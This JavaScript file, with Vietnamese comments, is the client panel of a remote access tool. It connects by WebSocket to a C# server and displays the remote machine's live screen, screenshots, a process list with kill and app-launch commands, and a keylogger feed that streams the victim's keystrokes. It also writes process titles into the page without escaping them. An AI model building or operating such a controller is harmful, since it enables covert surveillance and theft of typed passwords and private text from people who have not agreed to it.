let socket = null;
let objectUrl = null;

// --- 1. KẾT NỐI SERVER ---
function initiateConnection() {
    const ip = document.getElementById("server-ip").value.trim();
    const port = document.getElementById("server-port").value.trim();
    const pass = document.getElementById("auth-pass").value.trim();
    const errorLabel = document.getElementById("login-error");

    if (!ip || !port) {
        errorLabel.textContent = "Please enter IP and Port!";
        return;
    }

    errorLabel.textContent = "Connecting...";

    try {
        socket = new WebSocket(`ws://${ip}:${port}`);
        // [QUAN TRỌNG] Chế độ nhận dữ liệu Binary để xử lý Stream Video
        socket.binaryType = "arraybuffer";

        socket.onopen = () => {
            // Gửi gói tin AUTH theo chuẩn WebPacket của Server C#
            const authPacket = JSON.stringify({ type: "AUTH", payload: pass });
            socket.send(authPacket);
        };

        socket.onmessage = (event) => {
            if (event.data instanceof ArrayBuffer) {
                // Nếu nhận được dữ liệu nhị phân -> Xử lý Video Stream
                handleBinaryStream(event.data);
            } else {
                // Nếu nhận được văn bản -> Xử lý JSON
                handleJsonData(event.data);
            }
        };

        socket.onclose = () => handleDisconnect();
        socket.onerror = () => { errorLabel.textContent = "Connection Error! Check Server."; };
    } catch (e) {
        errorLabel.textContent = "Invalid IP Address!";
    }
}

function handleDisconnect() {
    document.getElementById("main-interface").classList.add("disabled-ui");
    const loginOverlay = document.getElementById("login-overlay");
    loginOverlay.style.display = "flex";
    loginOverlay.style.opacity = "1";
    
    document.getElementById("login-error").textContent = "Disconnected from Server.";
    
    const badge = document.getElementById("connectionBadge");
    badge.className = "status-badge status-offline";
    badge.innerHTML = '<i class="fas fa-circle"></i> Disconnected';

    if (objectUrl) URL.revokeObjectURL(objectUrl);
    if (socket) socket.close();
}

// --- 2. XỬ LÝ DỮ LIỆU NHẬN VỀ ---
function handleBinaryStream(arrayBuffer) {
    if (objectUrl) URL.revokeObjectURL(objectUrl);
    
    // Tạo Blob từ dữ liệu nhị phân nhận được
    const blob = new Blob([arrayBuffer], { type: "image/jpeg" });
    objectUrl = URL.createObjectURL(blob);

    const img = document.getElementById("live-screen");
    img.src = objectUrl;
    img.style.display = "block";
    document.getElementById("screen-placeholder").style.display = "none";
    document.getElementById("monitorStatus").innerText = "Live Streaming";
}

function handleJsonData(jsonString) {
    try {
        const msg = JSON.parse(jsonString);

        switch (msg.type) {
            case "AUTH_RESULT":
                if (msg.payload === "OK") {
                    // Hiệu ứng tắt Login Overlay
                    const overlay = document.getElementById("login-overlay");
                    overlay.style.opacity = "0";
                    setTimeout(() => {
                        overlay.style.display = "none";
                        document.getElementById("main-interface").classList.remove("disabled-ui");
                    }, 500);

                    const badge = document.getElementById("connectionBadge");
                    badge.className = "status-badge status-online";
                    badge.innerHTML = '<i class="fas fa-circle"></i> Online';
                    logToTerminal("System Connected.", "system");

                    // Tự động lấy danh sách ứng dụng khi kết nối thành công
                    getApps();
                } else {
                    document.getElementById("login-error").textContent = "Wrong Password!";
                    socket.close();
                }
                break;

            case "SCREEN_CAPTURE":
                // Nhận ảnh Base64 (Chất lượng cao)
                const img = document.getElementById("live-screen");
                img.src = "data:image/jpeg;base64," + msg.payload;
                img.style.display = "block";
                document.getElementById("screen-placeholder").style.display = "none";
                document.getElementById("monitorStatus").innerText = "HD Screenshot";
                break;

            case "LOG":
                // Xử lý Log (Keylogger hoặc thông báo hệ thống)
                const isKeylog = msg.payload.includes("[Keylogger]");
                logToTerminal(msg.payload, isKeylog ? "keylog" : "info");
                break;

            case "PROCESS_LIST":
            case "APP_LIST":
                renderProcessTable(msg.payload);
                break;
        }
    } catch (e) {
        console.error("JSON Error:", e);
    }
}

// --- 3. GỬI LỆNH (COMMANDS) ---
function sendCmd(command, param = "") {
    if (socket && socket.readyState === WebSocket.OPEN) {
        // [QUAN TRỌNG] Cấu trúc này phải khớp với class WebPacket trong C#
        const packet = {
            command: command,
            param: param.toString()
        };
        socket.send(JSON.stringify(packet));
    }
}

// Các hàm gọi lệnh cụ thể (Wrapper)
function sendCommand(cmd) { sendCmd(cmd); }
function getProcesses() { sendCmd("GET_PROCESS"); }
function getApps() { sendCmd("GET_APPS"); }
function startApp() {
    const appName = document.getElementById("quickAppInput").value;
    if (appName) {
        sendCmd("START_APP", appName);
        logToTerminal(`Command: Start ${appName}`);
    }
}
function disconnect() { if (socket) socket.close(); }

// --- 4. HÀM HỖ TRỢ GIAO DIỆN (UI) ---
function switchTab(tabName, element) {
    document.querySelectorAll(".list-group-item").forEach((el) => el.classList.remove("active"));
    element.classList.add("active");
    
    document.querySelectorAll(".tab-content").forEach((el) => el.classList.remove("active"));
    document.getElementById(`tab-${tabName}`).classList.add("active");

    const titles = {
        dashboard: "Overview",
        monitor: "Screen Monitor",
        processes: "Task Manager",
        terminal: "Terminal & Logs",
    };
    document.getElementById("pageTitle").innerText = titles[tabName];
}

function renderProcessTable(dataList) {
    const tbody = document.querySelector("#procTable tbody");
    tbody.innerHTML = "";
    
    dataList.forEach((item) => {
        const tr = document.createElement("tr");
        // Xử lý hiển thị Title (Apps) hoặc Name (Process)
        const displayName = item.title || item.name; 
        
        tr.innerHTML = `
            <td><span class="badge bg-secondary">${item.id}</span></td>
            <td class="fw-bold">${displayName}</td>
            <td>${item.memory || "N/A"}</td>
            <td>
                <button class="btn btn-danger btn-sm" onclick="if(confirm('Kill ID ${item.id}?')) sendCmd('KILL', '${item.id}')">
                    <i class="fas fa-trash"></i> Kill
                </button>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

function logToTerminal(text, type = "info") {
    const term = document.getElementById("terminal-output");
    
    if (type === "keylog") {
        // Xử lý hiển thị Keylogger: In ngang hàng
        const key = text.replace("[Keylogger] ", "");
        const displayKey = key.length > 1 ? ` [${key}] ` : key;
        
        if (term.lastChild && term.lastChild.classList && term.lastChild.classList.contains("keylog-stream")) {
            term.lastChild.textContent += displayKey;
        } else {
            const div = document.createElement("div");
            div.className = "keylog-stream";
            div.style.color = "#fbbf24"; // Màu vàng cho phím
            div.textContent = `> ${displayKey}`;
            term.appendChild(div);
        }
    } else {
        // Thông báo hệ thống: Xuống dòng mới
        const div = document.createElement("div");
        div.style.color = type === "system" ? "#3b82f6" : "#10b981";
        div.textContent = `[${new Date().toLocaleTimeString()}] > ${text}`;
        term.appendChild(div);
    }
    term.scrollTop = term.scrollHeight;
}